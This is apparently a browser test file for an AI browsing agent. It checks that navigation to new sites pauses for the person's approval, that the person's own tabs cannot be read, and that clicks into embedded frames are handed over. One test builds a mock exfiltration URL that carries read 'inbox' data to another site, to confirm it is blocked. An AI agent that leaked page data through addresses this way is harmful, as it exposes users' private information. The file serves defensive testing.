/* Any copyright is dedicated to the Public Domain.
   https://creativecommons.org/publicdomain/zero/1.0/ */

"use strict";

// W23 secfix H2: the agent can't carry what it read out in an address.
// navigate and tabs_create to a site the task hasn't been on pause with
// "Go to <site>?"; Whimsy's own tasks read only their own tabs (and, in
// Drive, the ones the person attached).

const { WhimsyAI } = ChromeUtils.importESModule("resource:///modules/whimsy/WhimsyAI.sys.mjs");
const { WhimsyClaude } = ChromeUtils.importESModule("resource:///modules/whimsy/WhimsyClaude.sys.mjs");
const { WhimsyAgentTasks } = ChromeUtils.importESModule("resource:///modules/whimsy/WhimsyAgentTasks.sys.mjs");
const { WhimsyAgentGuard } = ChromeUtils.importESModule("resource:///modules/whimsy/WhimsyAgentGuard.sys.mjs");

const ROOT = getRootDirectory(gTestPath).replace("chrome://mochitests/content", "https://example.com");
const PAGE = ROOT + "whimsy_secfix_inject.html";
const OTHER = getRootDirectory(gTestPath).replace("chrome://mochitests/content", "https://example.org") + "whimsy_secfix_inject.html";

const textOf = result => result.content.filter(c => c.type == "text").map(c => c.text).join("\n");
const own = (task, name, args = {}) => WhimsyClaude.callTool(name, args, { taskId: task.id });
const waitForPause = (task, kind) =>
  TestUtils.waitForCondition(() => task.pause && !task.pause.choice && task.pause.kind == kind && task.pause, `The task pauses (${kind})`);

add_setup(async function () {
  await SpecialPowers.pushPrefEnv({ set: [["whimsy.ai.enabled", true]] });
  WhimsyAgentGuard._setTrustedSitesForTesting(null);
  registerCleanupFunction(async () => {
    WhimsyAgentTasks._resetForTesting();
    WhimsyClaude.shutdown();
    await WhimsyAI.pending;
  });
});

add_task(async function new_site_pauses_before_any_request() {
  const task = WhimsyAgentTasks.start({ client: "whimsy", mode: "background" });
  const tabs = gBrowser.tabs.length;
  let pending = own(task, "tabs_create", { url: PAGE });
  let pause = await waitForPause(task, "navigate");
  is(pause.preview.title, "Go to example.com?", "It asks before going to a site the task hasn't been on");
  Assert.deepEqual(pause.choices, ["do", "skip"], "Go there or Skip");
  is(gBrowser.tabs.length, tabs, "No tab opens, so nothing has been requested yet");
  WhimsyAgentTasks.decide(task.id, "skip");
  ok(textOf(await pending).includes("chose not to go to example.com"), "Skip tells the agent");
  is(gBrowser.tabs.length, tabs, "and nothing loaded");

  pending = own(task, "tabs_create", { url: PAGE });
  await waitForPause(task, "navigate");
  WhimsyAgentTasks.decide(task.id, "do");
  const { tabId } = JSON.parse(textOf(await pending));
  ok(task.sites.has("example.com"), "Once there, the site counts as visited");
  const again = await own(task, "navigate", { tabId, url: PAGE + "?page=2" });
  ok(!again.isError && !task.pause, "Moving around a visited site doesn't ask");

  // The exfiltration shape: what it read, in the address of a new site.
  const leak = "inbox-" + "x".repeat(150);
  pending = own(task, "navigate", { tabId, url: `${OTHER}?items=${leak}` });
  pause = await waitForPause(task, "navigate");
  is(pause.preview.title, "Go to example.org?", "A new site asks");
  ok(pause.preview.fields.some(f => f.strong && /characters of data/.test(f.value)), "and says the address carries data");
  ok(!pause.preview.fields.some(f => String(f.value).includes(leak)), "without echoing it");
  ok(!pause.allowForTask, "No don't-ask-again for new sites");
  WhimsyAgentTasks.decide(task.id, "skip");
  await pending;
  const tab = WhimsyClaude.tabById(tabId);
  ok(!tab.linkedBrowser.currentURI.spec.includes("inbox-"), "The data never left");
  WhimsyAgentTasks.finish(task.id);
  BrowserTestUtils.removeTab(tab);
});

add_task(async function start_and_named_sites_count_as_visited() {
  const task = WhimsyAgentTasks.start({ client: "whimsy", mode: "background", sites: ["example.com"] });
  const result = await own(task, "tabs_create", { url: PAGE });
  ok(!result.isError && !task.pause, "A site the person named (or started on) goes ahead");
  const { tabId } = JSON.parse(textOf(result));
  WhimsyAgentTasks.finish(task.id);
  BrowserTestUtils.removeTab(WhimsyClaude.tabById(tabId));
});

add_task(async function background_never_reads_the_persons_tabs() {
  const mine = await BrowserTestUtils.openNewForegroundTab(gBrowser, PAGE + "?mine");
  const mineId = WhimsyClaude.tabId(mine);
  const task = WhimsyAgentTasks.start({ client: "whimsy", mode: "background", sites: ["example.com"] });
  const listed = await own(task, "tabs_list");
  ok(!textOf(listed).includes("?mine"), "Background: the person's tabs aren't listed");
  for (const tool of ["read_page", "get_page_text", "screenshot", "click"]) {
    const result = await own(task, tool, { tabId: mineId, coordinate: [5, 5] });
    ok(result.isError && textOf(result).includes("the person's, not this task's"), `${tool} on the person's tab is refused, with a reason the model sees`);
  }
  WhimsyAgentTasks.finish(task.id);

  const drive = WhimsyAgentTasks.start({ client: "whimsy", mode: "drive", sites: ["example.com"] });
  ok((await own(drive, "read_page", { tabId: mineId })).isError, "Drive: an unattached tab is refused too");
  drive.attached.add(mine);
  const read = await own(drive, "get_page_text", { tabId: mineId });
  ok(!read.isError && textOf(read).includes("Cheap flights"), "Drive reads a tab the person attached");
  WhimsyAgentTasks.finish(drive.id);
  BrowserTestUtils.removeTab(mine);
});

// W23 secfix M3: a click into an embedded frame always pauses; another
// site's frame (One Tap, PayPal, a post widget) is handed to the person.
add_task(async function frame_clicks_pause() {
  const unit = WhimsyAgentGuard.classify("click", { role: "iframe", tag: "iframe", text: "", frame: { crossOrigin: true, host: "accounts.google.com" }, url: "https://shop.example/" });
  is(unit?.kind, "unsure", "A cross-origin frame is never a free click");
  ok(unit.handOver, "and is the person's to press");
  is(unit.preview.reason, "frame", "saying why");

  const task = WhimsyAgentTasks.start({ client: "whimsy", mode: "background", sites: ["example.com"] });
  const created = await own(task, "tabs_create", { url: ROOT + "whimsy_secfix_frame.html" });
  const { tabId } = JSON.parse(textOf(created));
  const tab = WhimsyClaude.tabById(tabId);
  await TestUtils.waitForCondition(
    () => SpecialPowers.spawn(tab.linkedBrowser, [], () => content.document.getElementById("onetap")?.getBoundingClientRect().width > 0).catch(() => false),
    "The frames are laid out"
  );
  for (const [id, handOver] of [["onetap", true], ["same", false]]) {
    const [x, y] = await SpecialPowers.spawn(tab.linkedBrowser, [id], frameId => {
      const r = content.document.getElementById(frameId).getBoundingClientRect();
      return [r.x + r.width / 2, r.y + r.height / 2];
    });
    const pending = own(task, "click", { tabId, coordinate: [x, y] });
    const pause = await waitForPause(task, "unsure");
    is(!!pause.handOver, handOver, `${id}: ${handOver ? "another site's frame is handed over" : "a same-site frame asks first"}`);
    WhimsyAgentTasks.decide(task.id, "skip");
    ok(textOf(await pending).includes("chose not to"), `${id}: skipping doesn't click`);
  }
  WhimsyAgentTasks.finish(task.id);
  BrowserTestUtils.removeTab(tab);
});
